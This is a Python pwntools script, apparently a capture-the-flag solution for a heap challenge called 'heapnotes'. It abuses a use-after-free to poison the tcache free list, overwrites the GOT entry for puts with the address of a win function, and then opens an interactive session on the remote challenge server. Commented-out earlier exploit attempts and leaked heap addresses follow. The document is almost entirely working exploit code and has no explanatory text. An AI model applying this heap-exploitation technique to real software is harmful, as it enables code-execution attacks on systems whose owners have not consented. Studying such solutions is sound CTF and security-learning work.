from pwn import *

elf = context.binary = ELF("heapnotes")

#r = process()
r = remote("chal.nbctf.com", 30172)

def free(i):
    r.sendline(b"4")
    r.sendline(str(i).encode())

def update(i, value):
    r.sendline(b"3")
    r.sendline(str(i).encode())
    r.sendline(value)

def read(i):
    r.sendline(b"2")
    r.clean()
    r.sendline(str(i).encode())
    data = u64((r.recvline()[:-1].ljust(8, b"\x00")))
    return data

def create(value):
    r.sendline(b"1")
    r.sendline(value)

puts = p64(elf.got["puts"])
win = p64(elf.sym["win"])

create("yes0")
create("yes1")
create("yes2")
free(0)
free(1)
free(2)

update(1, puts)

create("yes")
create("yes")
create(win)

r.interactive()


'''for i in range(9):
    r.sendline(b"1")
    r.sendline(b"A"*63)'''

'''create("yes")
create("yes")
free(0)
free(1)
data=read(0)
update(0, p64(data))
free(0)

#gdb.attach(r, gdbscript="break *0x4012fe")

create("junk")
create("junk")

free(0)
create(b"\x00"*8+win)



r.interactive()


create(b"\x00"*8+win)

r.interactive()
'''
'''
NOTE 0 0x42f
NOTE 1 0x42f68f
NOTE 2 0x42f6df
NOTE 3 0x42f76f
NOTE 4 0x42f7bf
NOTE 5 0x42f7cf
NOTE 6 0x42f01f
NOTE 7 0x42f
NOTE 8 0x42f0ef
NOTE 9 0x42f13f
NOTE 10 0x42f14f
NOTE 11 0x42f19f
NOTE 12 0x42f22f
NOTE 13 0x42f27f
NOTE 14 0x42f28f
NOTE 15 0x42f2df
'''